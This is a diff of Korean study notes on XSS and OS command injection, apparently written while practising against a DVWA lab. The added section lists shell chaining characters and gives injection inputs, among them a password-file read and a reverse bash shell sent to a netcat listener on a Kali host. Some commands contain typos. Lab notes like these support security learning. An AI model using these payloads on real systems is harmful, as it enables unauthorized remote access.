@@ -1,4 +1,4 @@
-> Cross Site Scripting 취약점이 있는 웹사이트에 방문한 사용자의 웹 브라우저에서 악의적인 HTML 태그나 자바스크립트가 동작하는 공격이다. 악의적인 공격자가 작성한 스크립트 코드가 피해자의 시스템에서 실행되는 것.
+![](../Images/dfadsafasdfasdgah.png)> Cross Site Scripting 취약점이 있는 웹사이트에 방문한 사용자의 웹 브라우저에서 악의적인 HTML 태그나 자바스크립트가 동작하는 공격이다. 악의적인 공격자가 작성한 스크립트 코드가 피해자의 시스템에서 실행되는 것.
 
 **공격 목적**
 - 쿠키 훔치기
@@ -113,3 +113,51 @@ ASPSESSIONIDCSTBCQTA=GACOEGOCDGLKBECBNFANBGDN
 - `$_GET` 이후 아무런 조치 없이 모든 input 값에 대하여 서버에 검증하는 도구도 없기 때문에 위에 기술된 공격 내용이 모두 적용된다.
 - Medium 방식도 단순하게 `<script> 문자열을 포함`하는 string 값에 대한 처리만 이루어지기 때문에 이외 모든 공격이 가능하다.
 - Impossible 값에도 비슷하게 ` checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );`에 대한 처리가 이루어지지만 사실상 특수문자를 기입하게 되면 그대로 XSS 공격이 가능하기 때문에 좋은 방어책이 아니게 보인다.
+
+
+---
+## Document Object Model
+- innetHTML , document.write()
+- textContent innerText
+>html 코드나 javascript 중 문자열 화면에 출력하는 메서드
+
+
+OS command injection
+사용자 입력값이 어플리케이션의 운영체제 명령어 실행 가능
+
+**리눅스**
+; 앞의 명령어가 끝나면 뒤 명령어가 실행되는 특수문자
+& 앞의 명령어를 백그라운드로 실행하고 바로 뒤의 명령을 실행
+&& 앞 명령어 성공 시 뒤 명령어를 실행
+| 앞 명령어 출력을 뒤 명령어 input 값으로 넘김
+|| 앞 명령어 실패 시 뒤 명령어를 실행
+
+
+**윈도우**
+& 앞 명령어가 끝나면 뒤 명령어를 실행하는 특수 문자
+&& 앞 명령이 성공하면 뒤 명령어 실행
+| 앞 명령어 출력을 뒤 명령어 input 값으로 넘김
+|| 앞 명령어 실패 시 뒤 명령어를 실행
+ 
+
+공격 실행 1.
+ - (ip ); /cat/etc/passwd
+
+![](../Images/dfadsafasdfasdgah%201.png)
+
+
+공격 실행 2.
+
+kali linux 환경
+```bash
+ip a
+ping 8.8.8.8
+nc -lvnp 4444 //Listening 4444 port open
+
+192.168.63.133(kali linux ip)
+```
+
+DVWA command injection prompt
+```
+127.0.0.1; bash -i >&/dev/tcp/192.168.63.133/444 0 >&1
+```
